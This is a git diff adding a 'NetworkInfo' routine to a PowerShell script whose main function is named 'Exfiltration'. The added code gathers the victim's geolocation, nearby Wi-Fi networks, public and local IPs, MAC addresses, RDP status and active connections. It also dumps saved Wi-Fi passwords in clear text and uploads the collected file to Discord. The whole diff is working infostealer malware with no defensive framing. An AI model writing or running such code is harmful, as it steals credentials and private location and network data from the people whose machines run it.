@@ -59,6 +59,9 @@ function Exfiltration {
 
     #Call Get-StorageAndTreeInfo
     StorageAndTreeInfo
+
+    #Call NetworkInfo
+    NetworkInfo
     
 }
 
@@ -203,6 +206,148 @@ function StorageAndTreeInfo {
     # Upload Storage_Info.txt to Discord
     Upload-Discord -file $storageFilePath -text "Storage and Directory Tree Information :"
 }
+
+
+# Function to get network information
+function NetworkInfo {
+    # Function to get geo-location
+    function GrabGeoLocation {
+        try {
+            # Add necessary assembly for accessing System.Device.Location namespace
+            Add-Type -AssemblyName System.Device 
+
+            # Create GeoCoordinateWatcher object
+            $GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher 
+
+            # Start resolving current location
+            $GeoWatcher.Start() 
+
+            # Wait for discovery
+            while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied')) {
+                Start-Sleep -Milliseconds 100 
+            }  
+
+            # Check for permission denial
+            if ($GeoWatcher.Permission -eq 'Denied') {
+                Write-Error 'Access Denied for Location Information'
+            } else {
+                # Select relevant results - Latitude and Longitude
+                $GeoWatcher.Position.Location | Select Latitude,Longitude 
+            }
+        }
+        # Handle exceptions and write error for troubleshooting
+        catch {
+            Write-Error "No coordinates found" 
+            return "No Coordinates found"
+            -ErrorAction SilentlyContinue
+        } 
+    }
+
+    # Get geo-location
+    $GeoLocation = GrabGeoLocation
+
+    # Split and extract latitude and longitude
+    $GeoLocation = $GeoLocation -split " "
+    $Lat = $GeoLocation[0].Substring(11) -replace ".$"
+    $Lon = $GeoLocation[1].Substring(10) -replace ".$"
+
+    # Get nearby wifi networks
+    try {
+        $NearbyWifi = (netsh wlan show networks mode=Bssid | ?{$_ -like "SSID*" -or $_ -like "*Authentication*" -or $_ -like "*Encryption*"}).Trim()
+    }
+    catch {
+        $NearbyWifi = "No nearby wifi networks detected"
+    }
+
+    # Get IP / Network Info
+    try {
+        $computerPubIP = (Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content
+    }
+    catch {
+        $computerPubIP = "Error getting Public IP"
+    }
+
+    try {
+        $localIP = Get-NetIPAddress -InterfaceAlias "*Ethernet*","*Wi-Fi*" -AddressFamily IPv4 | Select InterfaceAlias, IPAddress, PrefixOrigin | Out-String
+    }
+    catch {
+        $localIP = "Error getting local IP"
+    }
+
+    $MAC = Get-NetAdapter -Name "*Ethernet*","*Wi-Fi*" | Select Name, MacAddress, Status | Out-String
+
+    # Check RDP status
+    if ((Get-ItemProperty "hklm:\System\CurrentControlSet\Control\Terminal Server").fDenyTSConnections -eq 0) { 
+        $RDP = "RDP is Enabled" 
+    } else {
+        $RDP = "RDP is NOT enabled" 
+    }
+
+    # Get Network Interfaces
+    $NetworkAdapters = Get-WmiObject Win32_NetworkAdapterConfiguration | where { $_.MACAddress -notlike $null } | select Index, Description, IPAddress, DefaultIPGateway, MACAddress | Format-Table Index, Description, IPAddress, DefaultIPGateway, MACAddress | Out-String -width 250
+
+    # Get WiFi profiles and passwords
+    $wifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | % {
+        $name=$_.Matches.Groups[1].Value.Trim(); $_
+    } | % {
+        (netsh wlan show profile name="$name" key=clear) | Select-String "Key Content\W+\:(.+)$" | % {
+            $pass=$_.Matches.Groups[1].Value.Trim(); $_
+        } | % {
+            [PSCustomObject]@{ PROFILE_NAME=$name; PASSWORD=$pass }
+        } | Format-Table -AutoSize | Out-String
+    }
+
+    # Get Listeners / ActiveTcpConnections
+    $listener = Get-NetTCPConnection | select @{
+        Name="LocalAddress";Expression={$_.LocalAddress + ":" + $_.LocalPort}
+    }, @{
+        Name="RemoteAddress";Expression={$_.RemoteAddress + ":" + $_.RemotePort}
+    }, State, AppliedSetting, OwningProcess
+
+    # Join listener information with process information
+    $listener = $listener | foreach-object {
+        $listenerItem = $_
+        $processItem = ($process | where { [int]$_.Handle -like [int]$listenerItem.OwningProcess })
+        new-object PSObject -property @{
+          "LocalAddress" = $listenerItem.LocalAddress
+          "RemoteAddress" = $listenerItem.RemoteAddress
+          "State" = $listenerItem.State
+          "AppliedSetting" = $listenerItem.AppliedSetting
+          "OwningProcess" = $listenerItem.OwningProcess
+          "ProcessName" = $processItem.ProcessName
+        }
+    } | select LocalAddress, RemoteAddress, State, AppliedSetting, OwningProcess, ProcessName | Sort-Object LocalAddress | Format-Table | Out-String -width 250 
+
+    # Output to a text file
+    $outputPath = Join-Path $env:TEMP "NetworkInfo.txt"
+    @(
+        "Geo-Location Information:",
+        "    Latitude: $Lat",
+        "    Longitude: $Lon",
+        "Nearby WiFi Networks: $NearbyWifi",
+        "Public IP: $computerPubIP",
+        "Local IP: $localIP",
+        "MAC Address: $MAC",
+        "RDP Status: $RDP",
+        "Network Adapters:",
+        "$NetworkAdapters",
+        "WiFi Profiles and Passwords:",
+        "$wifiProfiles",
+        "Listeners / Active TCP Connections:",
+        "$listener"
+    ) | Out-File -FilePath $outputPath
+
+    # Return the output path
+    $outputPath
+}
+
+# Call the function to get network information
+$networkInfoPath = NetworkInfo
+
+# Upload NetworkInfo.txt to Discord
+Upload-Discord -file $networkInfoPath -text "Network Information :"
+
+
 
 # Function to delete the temporary directory
 function DelTempDir {
